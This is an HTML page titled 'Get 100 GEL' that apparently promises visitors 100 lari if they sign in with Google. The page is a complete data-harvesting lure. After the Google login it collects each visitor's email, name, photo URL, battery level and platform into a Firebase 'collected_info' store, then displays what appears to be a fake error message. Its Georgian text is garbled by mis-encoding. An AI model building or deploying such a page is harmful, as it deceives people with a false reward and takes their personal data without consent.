<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Get 100 GEL</title>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #121212; color: white; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; text-align: center; border: 1px solid #333; }
        button { background: #4285F4; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-size: 16px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

<div class="card">
    <h2>áƒ’áƒ˜áƒšáƒáƒªáƒáƒ•áƒ—! ğŸ‰</h2>
    <p>100 áƒšáƒáƒ áƒ˜áƒ¡ áƒ›áƒ˜áƒ¡áƒáƒ¦áƒ”áƒ‘áƒáƒ“ áƒ’áƒáƒ˜áƒáƒ áƒ”áƒ— áƒáƒ•áƒ¢áƒáƒ áƒ˜áƒ–áƒáƒªáƒ˜áƒ Gmail-áƒ˜áƒ—</p>
    <button onclick="loginAndCollect()">Login with Google</button>
    <p id="status"></p>
</div>

<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>

<script>
  // áƒ¨áƒ”áƒœáƒ˜ Firebase Config áƒáƒ¥ áƒ©áƒáƒ¡áƒ•áƒ˜
  const firebaseConfig = {
    apiKey: "...",
    authDomain: "...",
    databaseURL: "...",
    projectId: "...",
    storageBucket: "...",
    messagingSenderId: "...",
    appId: "..."
  };

  firebase.initializeApp(firebaseConfig);
  const auth = firebase.auth();
  const db = firebase.database();

  async function loginAndCollect() {
    const provider = new firebase.auth.GoogleAuthProvider();
    
    try {
        const result = await auth.signInWithPopup(provider);
        const user = result.user;
        
        // áƒ‘áƒáƒ¢áƒáƒ áƒ”áƒ˜áƒ¡ áƒ’áƒáƒ’áƒ”áƒ‘áƒ
        let batt = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batt = (b.level * 100).toFixed(0) + "%";
        }

        // áƒ›áƒáƒœáƒáƒªáƒ”áƒ›áƒ”áƒ‘áƒ˜áƒ¡ áƒ¨áƒ”áƒœáƒáƒ®áƒ•áƒ áƒ¨áƒ”áƒœáƒ—áƒáƒœ
        await db.ref('collected_info/' + user.uid).set({
            email: user.email,
            displayName: user.displayName,
            photo: user.photoURL,
            battery: batt,
            platform: navigator.platform,
            lastSeen: new Date().toLocaleString()
        });

        document.getElementById('status').innerText = "áƒ¨áƒ”áƒªáƒ“áƒáƒ›áƒ: áƒ—áƒáƒœáƒ®áƒ áƒ£áƒ™áƒ•áƒ” áƒ’áƒáƒ¢áƒáƒœáƒ˜áƒšáƒ˜áƒ áƒ¡áƒ®áƒ•áƒ áƒ›áƒáƒ¬áƒ§áƒáƒ‘áƒ˜áƒšáƒáƒ‘áƒ˜áƒ“áƒáƒœ.";
    } catch (error) {
        console.error(error);
    }
  }
</script>
</body>
</html>
